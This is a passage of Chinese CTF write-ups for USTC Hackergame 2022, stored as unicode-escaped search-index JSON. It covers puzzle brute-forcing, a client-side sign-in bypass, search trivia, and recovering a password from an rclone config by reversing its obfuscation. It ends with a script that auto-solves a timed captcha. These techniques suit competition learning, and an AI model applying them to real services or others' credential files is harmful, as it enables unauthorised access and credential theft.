\u6bcf\u4e00\u6b65\u7684\u6253\u4e71\u7684\u65b9\u5f0f\u6709\u4e24\u79cd\uff0c\u9009\u62e9\u54ea\u4e00\u79cd\u5219\u7531\u60a8\u7684\u8f93\u5165\uff08\u957f\u5ea6\u4e3a 4/16/64 \u7684 0/1 \u5e8f\u5217\uff09\u7684\u67d0\u4e00\u4f4d\u51b3\u5b9a\u3002\u5982\u679c\u60a8\u5728\u6700\u540e\u80fd\u6210\u529f\u6253\u4e71\u8fd9\u4e2a\u62fc\u76d8\uff0c\u60a8\u5c31\u53ef\u4ee5\u83b7\u53d6\u5230 flag \u5566\uff0c\u5feb\u6765\u8bd5\u8bd5\u5427wwwwww \u7b2c\u4e00\u90e8\u5206\u8f93\u5165\u53ea\u6709\u56db\u4e2a bit\uff0c\u76f4\u63a5\u624b\u52a8\u8bd5\u5c31\u80fd\u8bd5\u51fa\u6765\u7b54\u6848\u662f 1000\uff0cflag\uff1a flag{it_works_like_magic_\u2026\u2026} \u7b2c\u4e8c\u90e8\u5206\u8f93\u5165\u6709 16 \u4e2a bit\uff0c\u53ef\u4ee5\u7528\u4ee3\u7801\u7206\u7834\u4e00\u4e0b\uff0c\u5c06\u9898\u7ed9\u4ee3\u7801\u4e2d\u7684\u4e3b\u903b\u8f91\u590d\u5236\u51fa\u6765\uff0c\u679a\u4e3e\u8f93\u5165\u8dd1\u4e00\u4e0b\uff1a import json from tqdm import tqdm from sys import argv class Board : def __init__ ( self ): self . b = [[ i * 4 + j for j in range ( 4 )] for i in range ( 4 )] def _blkpos ( self ): for i in range ( 4 ): for j in range ( 4 ): if self . b [ i ][ j ] == 15 : return ( i , j ) def reset ( self ): for i in range ( 4 ): for j in range ( 4 ): self . b [ i ][ j ] = i * 4 + j def move ( self , moves ): for m in moves : i , j = self . _blkpos () if m == 'L' : self . b [ i ][ j ] = self . b [ i ][ j - 1 ] self . b [ i ][ j - 1 ] = 15 elif m == 'R' : self . b [ i ][ j ] = self . b [ i ][ j + 1 ] self . b [ i ][ j + 1 ] = 15 elif m == 'U' : self . b [ i ][ j ] = self . b [ i - 1 ][ j ] self . b [ i - 1 ][ j ] = 15 else : self . b [ i ][ j ] = self . b [ i + 1 ][ j ] self . b [ i + 1 ][ j ] = 15 def __bool__ ( self ): for i in range ( 4 ): for j in range ( 4 ): if self . b [ i ][ j ] != i * 4 + j : return True return False with open ( \"chals/b16_obf.json\" ) as f : branches = json . load ( f ) b = Board () start = ... end = ... for i in tqdm ( range ( start , end )): b . reset () bits = bin ( i )[ 2 :] . zfill ( 16 ) for branch in branches : b . move ( branch [ 1 ] if bits [ branch [ 0 ]] == '1' else branch [ 2 ]) if b : print ( bits ) break \u7206\u7834\u51fa\u7ed3\u679c\u4e3a 0010111110000110\uff0cflag\uff1a flag{Branching_Programs_are_NC1_\u2026\u2026} \u7b2c\u4e09\u90e8\u5206\u592a\u590d\u6742\u4e86\uff0c\u5e94\u8be5\u7206\u7834\u4e0d\u51fa\u6765\uff0c\u6bd5\u7adf\u8fd9\u662f\u4e00\u9053 math \u9898\uff0c\u5f00\u6446\u3002 \u706b\u773c\u91d1\u775b\u7684\u5c0f E \u00b6 \u5c0f E \u6709\u5f88\u591a\u7684 ELF \u6587\u4ef6\uff0c\u5b83\u4eec\u91cc\u9762\u7684\u51fd\u6570\u6709\u70b9\u50cf\uff0c\u80fd\u628a\u5b83\u4eec\u5339\u914d\u8d77\u6765\u5417\uff1f \u5c0f A\uff1a\u8fd9\u4e0d\u662f\u7528 BinDiff \u5c31\u53ef\u4ee5\u4e86\u5417\uff0c\u5f88\u7b80\u5355\u5427\uff1f \u53ea\u505a\u4e86\u53f3\u624b\u5c31\u884c\u7684\u7b2c\u4e00\u90e8\u5206\uff0c\u4e5f\u5c31\u662f\u4e24\u6b21\u8fbe\u5230 100% \u6b63\u786e\u3002\u62d6\u8fdb IDA \u4e2d\u786c\u770b\uff0c\u627e CFG \u56fe\u4ee5\u53ca\u6c47\u7f16\u4ee3\u7801\u6bd4\u8f83\u7c7b\u4f3c\u7684\u51fd\u6570\u5373\u53ef\uff0c\u65f6\u9650\u4e5f\u5f88\u957f\uff0c\u4e0d\u7528\u7740\u6025\uff0c\u5f88\u5bb9\u6613\u5c31\u80fd\u627e\u5230\u76f8\u4f3c\u7684\u51fd\u6570\u3002\u63d0\u4ea4\u62ff\u5230 flag\uff1a flag{easy_to_use_bindiff_\u2026\u2026} \uff08\u7b11\u6b7b\uff0c\u6839\u672c\u6ca1\u7528 bindiff\uff09 \u7b2c\u4e8c\u90e8\u5206\u8981\u6c42\u4e00\u4e2a\u5c0f\u65f6\u5185\u5b8c\u6210 100 \u9898\u4e2d\u7684 40 \u9898\uff0c\u7b2c\u4e09\u90e8\u5206\u8981\u6c42\u4e09\u5c0f\u65f6\u5185\u5b8c\u6210 200 \u9898\u4e2d\u7684 60 \u9898\uff0c\u4e0d\u60f3\u505a\uff0c\u5f00\u6446\u3002","title":"USTC Hackergame 2022"},{"location":"writeups/hackergame2022/#hackergame-2022-writeup","text":"Abstract \u7b2c\u4e8c\u6b21\u6765\u6253 Hackergame\u3002\u8fd9\u91cc\u662f\u6211\u505a\u51fa\u7684\u9898\u7684 writeup\uff0c\u535a\u5ba2\u7248\u5728\uff1a https://blog.tonycrane.cc/p/630bfdd5.html \u5b98\u65b9 writeup","title":"Hackergame 2022 Writeup"},{"location":"writeups/hackergame2022/#_1","text":"\u4f17\u6240\u5468\u77e5\uff0c\u7b7e\u5230\u9898\u662f\u4e00\u9053\u624b\u901f\u9898\u3002 \u4e3a\u4e86\u5145\u5206\u53d1\u6325\u51fa\u8bf8\u4f4d\u56e0\u4e3a\u5404\u79cd\u539f\u56e0\u800c\u624b\u901f\u4f18\u5f02\u4e8e\u5e38\u4eba\u7684\u9009\u624b\u4eec\u7684\u7279\u957f\uff0c\u6211\u4eec\u7cbe\u5fc3\u8bbe\u8ba1\u4e86\u4eca\u5e74\u7684\u7b7e\u5230\u9898\u3002\u8fdb\u4e00\u6b65\u5730\uff0c\u4e3a\u4e86\u66f4\u7ec6\u81f4\u5730\u533a\u5206\u4e0d\u540c\u624b\u901f\u7684\u9009\u624b\uff0c\u6211\u4eec\u8fd8\u901a\u8fc7\u8be6\u5c3d\u7684\u8c03\u7814\u53ca\u7edf\u8ba1\u5206\u6790\uff0c\u5c06\u7b7e\u4e0b\u5b57\u7b26\u7684\u65f6\u95f4\u9650\u5236\u5206\u4e3a\u4e86\u591a\u4e2a\u7b49\u7ea7\u3002\u53ea\u6709\u6700\u9876\u5c16\u7684\u624b\u901f\u9009\u624b\uff0c\u624d\u80fd\u5728 CPU \u6765\u5f97\u53ca\u53cd\u5e94\u4e4b\u524d\u987a\u5229\u7b7e\u4e0b 2022\uff0c\u4ece\u800c\u5f97\u5230\u5149\u8363\u7684 flag\uff01 \u4e00\u4e2a\u7f51\u7ad9\uff0c\u624b\u5199\u6570\u5b57\u6210\u529f\u8bc6\u522b\u4e3a 2022 \u5c31\u53ef\u4ee5\u5b8c\u6210\u7b7e\u5230\u3002\u4e0d\u8fc7\u9650\u5236\u4e86\u6bcf\u4e2a\u6570\u5b57\u7684\u65f6\u95f4\uff0c\u4f9d\u6b21\u4e3a 2s\u30011s\u30010.1s\u30010s\u3002 \u6211\u8fd8\u5929\u771f\u5730\u8bd5\u7740\u7b7e\u4e86\u597d\u51e0\u6b21\uff08\u5176\u5b9e\u662f\u6ca1\u6ce8\u610f\u5230\u90a3\u4e2a 0\uff09\uff0c \u75db\u5931\u4e00\u8840 \u3002 \u505a\u6cd5\u5176\u5b9e\u662f\u5728\u6e90\u7801\u91cc\u53d1\u73b0\u8bc6\u522b\u90fd\u5728\u524d\u7aef\u8fdb\u884c\uff0c\u6700\u7ec8\u63d0\u4ea4\u7684\u65f6\u5019\u662f\u8df3\u8f6c\u5230 /?result=.... \u9875\u9762\uff08\u6216\u8005\u4ea4\u4e00\u6b21\u8bd5\u4e00\u4e0b\u4e5f\u80fd\u770b\u51fa\u6765\uff09\u3002\u6240\u4ee5\u76f4\u63a5\u8bbf\u95ee /?result=2022 \u5373\u53ef\u62ff\u5230 flag\uff1a flag{HappyHacking2022-\u2026\u2026}","title":"\u7b7e\u5230"},{"location":"writeups/hackergame2022/#_2","text":"\u53c2\u52a0\u732b\u54aa\u95ee\u7b54\u55b5\uff0c\u53c2\u52a0\u55b5\u54aa\u95ee\u7b54\u8c22\u8c22\u55b5\u3002 \u7ecf\u5178\u9898\u76ee\uff0c\u641c\u7d22\u5927\u6742\u70e9\u3002\u9664\u4e86\u7b2c\u4e94\u9898\u4ee5\u5916\u8fd8\u662f\u5f88\u5bb9\u6613\u627e\u5230\u7684\u3002\uff08\u8fd9\u6b21\u7adf\u7136\u5206\u4e86\u4e24\u4e2a flag \u51fa\u6765 2333\uff09 .content blockquote ol { margin-top: 0; } \u4e2d\u56fd\u79d1\u5b66\u6280\u672f\u5927\u5b66 NEBULA \u6218\u961f\uff08USTC NEBULA\uff09\u662f\u4e8e\u4f55\u65f6\u6210\u7acb\u7684\u55b5\uff1f \u76f4\u63a5\u641c\u7d22\u4e86\u4e00\u4e0b \u201c\u4e2d\u56fd\u79d1\u6280\u5927\u5b66 NEBULA \u6218\u961f\u201d\uff0c\u627e\u5230\u4e86\u4e00\u7bc7\u65b0\u95fb\uff1a \u4e2d\u56fd\u79d1\u5b66\u6280\u672f\u5927\u5b66\u661f\u4e91\uff08Nebula\uff09\u6218\u961f\u5728\u7b2c\u516d\u5c4a\u5f3a\u7f51\u676f\u518d\u521b\u4f73\u7ee9 \uff0c\u5176\u4e2d\u6587\u672b\u6709\u7b80\u5355\u4ecb\u7ecd \u201c\u4e2d\u56fd\u79d1\u5b66\u6280\u672f\u5927\u5b66\u661f\u4e91\u6218\u961f\uff08Nebula\uff09\u6210\u7acb\u4e8e 2017 \u5e74 3 \u6708 \u2026\u2026\u201d \u6240\u4ee5\u7b54\u6848\u5c31\u662f 2017-03 \u3002 2022 \u5e74 9 \u6708\uff0c\u4e2d\u56fd\u79d1\u5b66\u6280\u672f\u5927\u5b66\u5b66\u751f Linux \u7528\u6237\u534f\u4f1a\uff08LUG @ USTC\uff09\u5728\u79d1\u5927\u6821\u5185\u627f\u529e\u4e86\u8f6f\u4ef6\u81ea\u7531\u65e5\u6d3b\u52a8\u3002\u9664\u4e86\u4e13\u6ce8\u4e8e\u81ea\u7531\u64b8\u732b\u7684\u4e3b\u4f1a\u573a\u4e4b\u5916\uff0c\u8fd8\u6709\u4e00\u4e9b\u548c\u6280\u672f\u76f8\u5173\u7684\u5206\u4f1a\u573a\uff08\u5982\u95ea\u7535\u6f14\u8bb2 Lightning Talk\uff09\u3002\u5176\u4e2d\u5728\u7b2c\u4e00\u4e2a\u95ea\u7535\u6f14\u8bb2\u4e3b\u9898\u91cc\uff0c\u4e3b\u8bb2\u4eba\u4e8e slides \u4e2d\u5c55\u793a\u4e86\u4e00\u5f20\u5728 GNOME Wayland \u4e0b\u4f7f\u7528 Wayland \u540e\u7aef\u4f1a\u51fa\u73b0\u663e\u793a\u95ee\u9898\u7684 KDE \u7a0b\u5e8f\u622a\u56fe\uff0c\u8bf7\u95ee\u8fd9\u4e2a KDE \u7a0b\u5e8f\u7684\u540d\u5b57\u662f\u4ec0\u4e48\uff1f \u5728 LUG @ USTC \u7684 wiki \u5c31\u80fd\u627e\u5230\u8f6f\u4ef6\u81ea\u7531\u65e5\u6d3b\u52a8\u7684\u9875\u9762\uff1a Software Freedom Day \uff0c\u5176\u4e2d\u53ef\u4ee5\u627e\u5230\u6240\u8bf4\u7684\u90a3\u7bc7 slides\uff1a \u300aGNOME Wayland \u4f7f\u7528\u4f53\u9a8c\uff1a\u4e00\u4e2a\u666e\u901a\u7528\u6237\u7684\u89c6\u89d2\u300b \uff0c\u5176\u4e2d\u7b2c\u5341\u4e94\u9875\u8bb2\u4e86\u6240\u8c13\u7684 KDE \u7a0b\u5e8f\u5728 Wayland \u4e0b\u7684\u663e\u793a\u95ee\u9898\u3002\u4f46\u622a\u56fe\u91cc\u5e76\u6ca1\u6709\u8f6f\u4ef6\u540d\uff0c\u628a\u4e0b\u9762\u4e00\u884c\u5de5\u5177\u680f\u7684\u6587\u672c\u5168\u603c\u5230\u5fc5\u5e94\u91cc\uff0c\u641c\u5230\u4e86 Kdenlive \u7684\u5b98\u65b9\u6587\u6863\u3002 \u6240\u4ee5\u7b54\u6848\u662f Kdenlive \u3002 22 \u5e74\u575a\u6301\uff0c\u5c0f C \u4ecd\u7136\u4f7f\u7528\u7740\u4e00\u53f0\u4ed6\u4ece\u5c0f\u7528\u5230\u5927\u7684 Windows 2000 \u8ba1\u7b97\u673a\u3002\u90a3\u4e48\uff0c\u5728\u4e0d\u53d8\u66f4\u7cfb\u7edf\u914d\u7f6e\u548c\u7a0b\u5e8f\u4ee3\u7801\u7684\u524d\u63d0\u4e0b\uff0cFirefox \u6d4f\u89c8\u5668\u80fd\u5728 Windows 2000 \u4e0b\u8fd0\u884c\u7684\u6700\u540e\u4e00\u4e2a\u5927\u7248\u672c\u53f7\u662f\u591a\u5c11\uff1f \u641c\u7d22 \u201cFirefox Windows 2000\u201d \u53ef\u4ee5\u770b\u5230 Firefox 13 \u4e0d\u518d\u652f\u6301 Windows 2000 \u7684\u5f88\u591a\u65b0\u95fb\u3002 \u6240\u4ee5\u7b54\u6848\u662f 12 \u3002 \u4f60\u77e5\u9053 PwnKit\uff08CVE-2021-4034\uff09\u55b5\uff1f\u636e\u53ef\u9760\u8c23\u4f20\uff0c\u51fa\u9898\u7ec4\u7684\u67d0\u4f4d\u540c\u5b66\u672c\u6765\u60f3\u51fa\u8fd9\u6837\u4e00\u9053\u7c7b\u4f3c\u7684\u9898\uff0c\u4f46\u662f\u53d1\u73b0 Linux \u5185\u6838\u66f4\u65b0\u4e4b\u540e\u5c45\u7136\u4e0d\u518d\u5141\u8bb8 argc \u4e3a 0 \u4e86\u55b5\uff01\u90a3\u4e48\uff0c\u8bf7\u627e\u51fa\u5728 Linux \u5185\u6838 master \u5206\u652f\uff08torvalds/linux.git\uff09\u4e0b\uff0c\u9996\u4e2a\u53d8\u52a8\u6b64\u884c\u4e3a\u7684 commit \u7684 hash \u5427\u55b5\uff01 \u5728 Linux \u5185\u6838 GitHub dev \u9875\u9762\u5168\u5c40\u641c\u7d22\u4e86\u4e00\u4e0b argc == 0\uff0c\u53d1\u73b0\u4e86\u4e00\u4e9b\u68c0\u67e5\u3002\u627e\u5230\u4e2a\u6bd4\u8f83\u50cf\u7684\u8fdb\u5230\u9875\u9762\u91cc blame\uff0c\u627e\u5230\u4e86 commit\uff1a exec: Force single empty string when argv is empty \uff08\u5176\u5b9e commit message \u91cc\u5c31\u5199\u4e86 CVE-2021-4034\uff09\u3002 \u6240\u4ee5\u7b54\u6848\u662f dcd46d897adb70d63e025f175a00a89797d31a43 \u3002 \u901a\u8fc7\u76d1\u89c6\u732b\u54aa\u5728\u952e\u76d8\u4e0a\u770b\u4f3c\u4e71\u8e29\u7684\u6545\u610f\u884c\u4e3a\uff0c\u4e0d\u51fa\u6240\u6599\u53d1\u73b0\u5176\u79d8\u5bc6\u8fde\u4e0a\u4e86\u4e00\u4e2a ssh \u670d\u52a1\u5668\uff0c\u7ec8\u7aef\u663e\u793a ED25519 key fingerprint is MD5:e4:ff:65:d7:be:5d:c8:44:1d:89:6b:50:f5:50:a0:ce. \uff0c\u4f60\u77e5\u9053\u732b\u54aa\u5728\u8fde\u63a5\u4ec0\u4e48\u57df\u540d\u5417\uff1f \u6bd4\u8f83\u96be\u641e\u7684\u4e00\u9053\u9898\uff0c\u60f3\u4e86\u5f88\u957f\u65f6\u95f4\uff0c\u751a\u81f3\u4ee5\u4e3a\u662f\u4e00\u4e9b crypto \u9898\u3002\u4e0d\u8fc7\u6bd5\u7adf\u662f\u4e00\u9053\u641c\u7d22\u9898\uff0c\u4e8e\u662f\u76f4\u63a5\u628a md5 fingerprint \u603c\u5230\u8c37\u6b4c\u91cc\uff0c\u641c\u5230\u4e86\u4e00\u4e2a\u6587\u6863\u5176\u4e2d\u6709\u8fd9\u4e2a\uff08\u53ef\u80fd\u662f\u505a\u4e2a\u4f8b\u5b50\uff09\uff1a Zeek Logs > ssh.log \u3002\u770b\u5230\u91cc\u9762\u5bf9\u5e94\u7684 ip\uff1a205.166.94.16\uff0c\u8bbf\u95ee\u8fdb\u53bb\u770b\u5230\u4e86 sdf.org \u57df\u540d\u3002 \u6240\u4ee5\u7b54\u6848\u662f sdf.org \u3002\uff08\u5176\u5b9e\u662f\u56e4 flag \u9636\u6bb5\u624d\u505a\u51fa\u6765\u7684\uff09 \u4e2d\u56fd\u79d1\u5b66\u6280\u672f\u5927\u5b66\u53ef\u4ee5\u51fa\u6821\u8bbf\u95ee\u56fd\u5185\u56fd\u9645\u7f51\u7edc\u4ece\u800c\u5141\u8bb8\u4e91\u64b8\u732b\u7684\u201c\u7f51\u7edc\u901a\u201d\u5b9a\u4ef7\u4e3a 20 \u5143\u4e00\u4e2a\u6708\u662f\u4ece\u54ea\u4e00\u5929\u6b63\u5f0f\u5b9e\u884c\u7684\uff1f \u641c\u4e86\u4e00\u4e0b\uff0c\u53d1\u73b0\u4e86\u4e00\u7bc7\u901a\u77e5\uff1a \u5173\u4e8e\u5b9e\u884c\u65b0\u7684\u7f51\u7edc\u8d39\u7528\u5206\u62c5\u529e\u6cd5\u7684\u901a\u77e5 \uff0c\u662f 2011 \u5e74 1 \u6708 1 \u65e5\u65bd\u884c\u7684\uff0c\u4f46\u662f\u8fd9\u7bc7\u901a\u77e5\u91cc\u56fd\u9645\u7f51\u7edc\u901a\u8d39\u7528\u5e76\u6ca1\u6709\u6539\u53d8\uff0c\u8fd8\u662f 20 \u5143\u3002\u770b\u6765\u662f\u6bd4\u8f83\u4e45\u8fdc\u7684\u4e8b\u60c5\u4e86\u3002\u641c\u7d22\u540c\u540d\u901a\u77e5\uff0c\u53ef\u4ee5\u53d1\u73b0 \u53e6\u4e00\u7bc7 \u3002\u91cc\u9762\u5199\u4e86\u56fd\u9645\u7f51\u7edc\u901a\u5b9a\u4ef7 20 \u5143\uff0c2003 \u5e74 3 \u6708 1 \u65e5\u5b9e\u884c\u3002 \u6240\u4ee5\u7b54\u6848\u662f 2003-03-01 \u3002 \u4ea4\u4e0a\u53bb\u5f97\u5230\u4e24\u4e2a flag\uff08\u4e00\u4e2a\u662f\u5bf9\u4e09\u9053\u9898\u7684\uff0c\u4e00\u4e2a\u662f\u5bf9\u516d\u9053\u9898\u7684\uff09\uff1a flag{meowexammeow_\u2026\u2026} flag{meowexamfullymeowed!_\u2026\u2026}","title":"\u732b\u54aa\u95ee\u7b54\u55b5"},{"location":"writeups/hackergame2022/#_3","text":"\u5b9e\u9a8c\u5ba4\u7ed9\u5c0f K \u5206\u914d\u4e86\u4e00\u4e2a\u9ad8\u6027\u80fd\u670d\u52a1\u5668\u7684\u8d26\u6237\uff0c\u4e3a\u4e86\u4e0d\u7528\u91cd\u65b0\u914d\u7f6e VSCode, Rclone \u7b49\u5c0f K \u5e38\u7528\u7684\u751f\u4ea7\u529b\u5de5\u5177\uff0c\u6700\u7b80\u5355\u7684\u65b9\u6cd5\u5f53\u7136\u662f\u628a\u81ea\u5df1\u7684\u5bb6\u76ee\u5f55\u6253\u5305\u62f7\u8d1d\u8fc7\u53bb\u3002 \u4f46\u662f\u5f88\u4e0d\u5de7\uff0c\u5bf9\u5b58\u653e\u4e8e\u5c0f K \u7535\u8111\u91cc\u7684 Hackergame 2022 \u7684 flag \u89ca\u89ce\u5df2\u4e45\u7684 Eve \u540c\u5b66\u6070\u597d\u6700\u8fd1\u62ff\u5230\u4e86\u8fd9\u4e2a\u670d\u52a1\u5668\u7684\u7ba1\u7406\u5458\u6743\u9650\uff08\u901a\u8fc7\u89ca\u89ce\u53e6\u4e00\u4f4d\u540c\u5b66\u7684\u654f\u611f\u4fe1\u606f\uff09\uff0c\u4e8e\u662f\u4e5f\u62ff\u5230\u4e86\u5c0f K \u540c\u5b66\u5bb6\u76ee\u5f55\u7684\u538b\u7f29\u5305\u3002 \u7136\u800c\u66f4\u4e0d\u5de7\u7684\u662f\uff0c\u7531\u4e8e Hackergame \u90e8\u7f72\u4e86\u57fa\u4e8e\u9b54\u6cd5\u7684\u4f5c\u5f0a\u884c\u4e3a\u9884\u77e5\u7cfb\u7edf\uff0cEve \u540c\u5b66\u8fd8\u672a\u6765\u5f97\u53ca\u89e3\u538b\u538b\u7f29\u5305\u5c31\u88ab Z \u540c\u5b66\u63d0\u524d\u6293\u83b7\u3002 \u4e3a\u4e86\u8bc1\u660e Eve \u540c\u5b66\u4e0d\u826f\u4f01\u56fe\u7684\u5371\u5bb3\u6027\uff0c\u4f60\u80fd\u5728\u8fd9\u4e2a\u538b\u7f29\u5305\u91cc\u627e\u5230\u91cd\u8981\u7684 flag \u4fe1\u606f\u5417\uff1f \u7ed9\u4e86\u4e00\u4e2a\u7528\u6237\u5bb6\u76ee\u5f55\u7684\u538b\u7f29\u5305\uff0c\u8fdb\u53bb\u5168\u5c40\u641c\u7d22\u4e00\u4e0b flag \u53ef\u4ee5\u53d1\u73b0 VSCode \u7684\u5386\u53f2\u6587\u4ef6\u91cc\u6709\u4e00\u4e2a DUGV.c \u91cc\u6709\u4e00\u4e2a\u6ce8\u91ca\u6389\u7684 flag\uff1a flag{finding_everything_through_vscode_config_file_\u2026\u2026} \uff08\u62a2\u4e86\u4e2a\u4e00\u8840 2333\uff09 \u7b2c\u4e8c\u90e8\u5206\u8fd8\u662f\u6709\u4e9b\u590d\u6742\u7684\u3002\u641c flag \u7684\u65f6\u5019\u8fd8\u53ef\u4ee5\u53d1\u73b0 .config/rclone/rclone.conf \u91cc\u6709\u4e00\u4e2a\u540d\u4e3a flag2 \u7684\u914d\u7f6e\u9879\uff1a [flag2] type = ftp host = ftp . example . com user = user pass = tqqTq4tmQRDZ0sT_leJr7-WtCiHVXSMrVN49dWELPH1uce-5DPiuDtjBUN3EI38zvewgN5JaZqAirNnLlsQ \u6ca1\u7528\u8fc7 rclone\uff0c\u81ea\u5df1\u88c5\u4e86\u4e00\u4e2a\u8bd5\u4e86\u4e00\u4e0b\uff0c\u53d1\u73b0 pass \u662f\u6df7\u6dc6\u540e\u7684\uff0c\u800c\u4e14\u662f\u968f\u673a\u7684\uff0c\u6709\u4e00\u4e2a\u547d\u4ee4 rclone obscure \u53ef\u4ee5\u7528\u6765\u6df7\u6dc6\u5bc6\u7801\u3002\u6587\u6863\u91cc\u4e5f\u8bf4\u4e86\u6df7\u6dc6\u7684\u76ee\u7684\u4e5f\u53ea\u662f\u9632\u6b62\u6709\u4eba\u53ef\u4ee5\u4e00\u773c\u770b\u5230\u5bc6\u7801\u800c\u5df2\uff0c\u5e76\u6ca1\u6709\u52a0\u5bc6\uff0crclone \u662f\u53ef\u4ee5\u76f4\u63a5\u590d\u539f\u660e\u6587\u7684\u3002\u4e8e\u662f\u5c31\u7ffb\u4e86\u4e0b rclone \u6e90\u7801\uff0c\u53ef\u4ee5\u5728 obscure \u76f8\u5173\u6e90\u7801 \u91cc\u627e\u5230\u6062\u590d\u76f8\u5173\u7684\u51fd\u6570 Reveal\uff0c\u590d\u5236\u4e0b\u6765\u8dd1\u4e00\u4e0b\u7ed9\u51fa\u7684 pass \u5373\u53ef\u4ee5\u6062\u590d\u5bc6\u7801\uff0c\u5373\uff1a flag{get_rclone_password_from_config!_\u2026\u2026}","title":"\u5bb6\u76ee\u5f55\u91cc\u7684\u79d8\u5bc6"},{"location":"writeups/hackergame2022/#heilang","text":"\u6765\u81ea Heicore \u793e\u533a\u7684\u65b0\u4e00\u4ee3\u7f16\u7a0b\u8bed\u8a00 HeiLang\uff0c\u57fa\u4e8e\u7b2c\u4e09\u4ee3\u5927\u87d2\u86c7\u8bed\u8a00\uff0c\u4f46\u662f\u629b\u5f03\u4e86\u539f\u6709\u7684\u96be\u4ee5\u7406\u89e3\u7684 | \u8fd0\u7b97\uff0c\u5347\u7ea7\u4e3a\u4e86\u66f4\u52a0\u5148\u8fdb\u7684\u8bed\u6cd5\uff0c\u7528 A[x | y | z] = t \u6765\u8868\u793a\u4e4b\u524d\u590d\u6742\u7684 A[x] = t; A[y] = t; A[z] = t\u3002 \u4f5c\u4e3a\u4e00\u4e2a\u7f16\u7a0b\u7231\u597d\u8005\uff0c\u6211\u89c9\u5f97\u5b9e\u5728\u662f\u592a\u9177\u4e86\uff0c\u5f88\u7b26\u5408\u6211\u5bf9\u672a\u6765\u7f16\u7a0b\u8bed\u8a00\u7684\u60f3\u8c61\uff0c\u79d1\u6280\u5e76\u5e26\u7740\u8da3\u5473\u3002 \u9898\u7ed9\u4e86\u4e00\u4e2a\u4ee5\u8fd9\u79cd\u8bed\u6cd5\u5199\u7684\u751f\u6210\u6570\u7ec4\u7684\u4ee3\u7801\uff0c\u4ee5\u53ca\u9a8c\u8bc1\u7ed3\u679c\u7684 python \u4ee3\u7801\u3002\u5176\u5b9e\u9898\u76ee\u5df2\u7ecf\u8bf4\u7684\u5f88\u660e\u786e\u4e86\uff0c\u4e0d\u8fc7\u61d2\u5f97\u5199\uff0c\u8bb0\u5f97 GitHub \u4e0a\u770b\u5230\u8fc7\u4e00\u4e2a\u9879\u76ee HeLang \uff0c\u4e0d\u8fc7\u91cc\u9762\u7684\u6570\u7ec4\u4e0b\u6807\u4ece 1 \u5f00\u59cb\uff0c\u6240\u4ee5\u5c31\u5199\u4e86\u6bb5\u4ee3\u7801\u6765\u5c06 [] \u4e2d\u7684\u6570\u90fd\u52a0\u4e00\uff0c\u8dd1\u4e00\u904d\u8f93\u51fa\u6570\u7ec4 a\uff0c\u7136\u540e\u66ff\u4ee3\u539f\u6765\u6587\u4ef6\u91cc\u7684\u90e8\u5206\uff0c\u8dd1\u4e00\u4e0b\u5c31\u53ef\u4ee5\u62ff\u5230 flag\uff1a flag{6d9ad6e9a6268d96-97091f6fffb6935c}","title":"HeiLang"},{"location":"writeups/hackergame2022/#xcaptcha","text":"\u9898\u76ee\u592a\u957f\u4e86\uff0c\u7701\u7565\u4e86\u90e8\u5206\u80cc\u666f\u6545\u4e8b \u4f17\u4eba\u76ee\u76ee\u76f8\u89d1\u3002 \u300c\u6211\u6765\u8bd5\u8bd5\u3002\u300d\uff0c\u4e00\u540d\u961f\u5458\u4e0a\u524d\u70b9\u51fb\u4e86\u6309\u94ae\u3002\u7136\u540e\uff0c\u5c4f\u5e55\u663e\u793a\u300c\u8bf7\u5728\u4e00\u79d2\u5185\u5b8c\u6210\u4ee5\u4e0b\u52a0\u6cd5\u8ba1\u7b97\u300d\u3002 \u8fd8\u6ca1\u7b49\u53cd\u5e94\u8fc7\u6765\uff0c\u5c4f\u5e55\u4e0a\u7684\u5b57\u53c8\u5f00\u59cb\u53d8\u5e7b\uff0c\u663e\u793a\u7740\u300c\u9a8c\u8bc1\u5931\u8d25\u300d\u3002\u800c\u4f60\u4f5c\u4e3a\u7a81\u51fb\u961f\u4e2d\u552f\u4e00\u7684\u9ed1\u5ba2\uff0c\u5168\u6751\u4eba\u6c11\u6700\u540e\u7684\u5e0c\u671b\uff0c\u8fce\u7740\u7eb7\u7eb7\u6295\u6765\u7684\u76ee\u5149\uff0c\u80fd\u5426\u5728\u89c4\u5b9a\u65f6\u95f4\u5185\u5b8c\u6210\u9a8c\u8bc1\uff0c\u6253\u5f00\u673a\u623f\uff0c\u4e0d\uff0c\u63a8\u5f00\u548c\u5e73\u65f6\u4ee3\u7684\u5927\u95e8\uff1f \u5927\u6982\u5c31\u662f\u70b9\u51fb\u8ba4\u8bc1\u540e\u5728\u4e00\u79d2\u5185\u8ba1\u7b97\u4e09\u4e2a\u5927\u6574\u6570\u52a0\u6cd5\u7136\u540e\u63d0\u4ea4\u3002\u624b\u5feb\u5b58\u4e00\u4efd html\uff0c\u6309\u7167\u5176\u4e2d\u8981\u6c42\u6b63\u5219\u4e00\u4e0b\u63d0\u53d6\u51fa\u7b97\u5f0f\u7136\u540e\u505a\u52a0\u6cd5\u518d post \u56de\u53bb\u3002 import re , requests url = \"http://202.38.93.111:10047/xcaptcha\" s = requests . session () s . get ( \"http://202.38.93.111:10047/?token=\u2026\u2026\" ) res = re . findall ( r \">(\\d*?)\\+(\\d*?) \" , s . get ( url ) . text ) print ( s . post ( url , data = { f 'captcha { i + 1 } ' : str ( int ( res [ i ][ 0 ]) + int ( res [ i ][ 1 ])) for i in range ( 3 )}) . text ) \uff08 \u7ecf\u5178\u538b\u884c \uff09\u8dd1\u4e00\u4e0b\u62ff\u5230 flag\uff1a flag{head1E55_br0w5er_and_ReQuEsTs_areallyour_FR1ENd_\u2026\u2026}","title":"Xcaptcha"},{"location":"writeups/hackergame2022/#latex","text":"\u5728\u7f51\u4e0a\u793e\u4ea4\u7fa4\u7ec4\u4e2d\u4ea4\u6d41\u6570\u5b66\u548c\u7269\u7406\u95ee\u9898\u65f6\uff0c\u603b\u662f\u514d\u4e0d\u4e86\u8f93\u5165\u516c\u5f0f\u3002\u800c\u663e\u7136\u5927\u591a\u6570\u5e38\u7528\u7684\u804a\u5929\u8f6f\u4ef6\u5e76\u4e0d\u80fd\u505a\u5230\u8fd9\u4e00\u70b9\u3002\u4e3a\u4e86\u65b9\u4fbf\u5927\u5bb6\u5728\u6c34\u7fa4\u548c\u5356\u5f31\u4e4b\u4f59\u80fd\u591f\u9ad8\u6548\u5730\u8fdb\u884c\u5b66\u672f\u4ea4\u6d41\uff0cG \u793e\u7684\u540c\u5b66\u5236\u4f5c\u4e86\u4e00\u4e2a\u7b80\u5355\u6613\u7528\u7684\u5c06 LaTeX 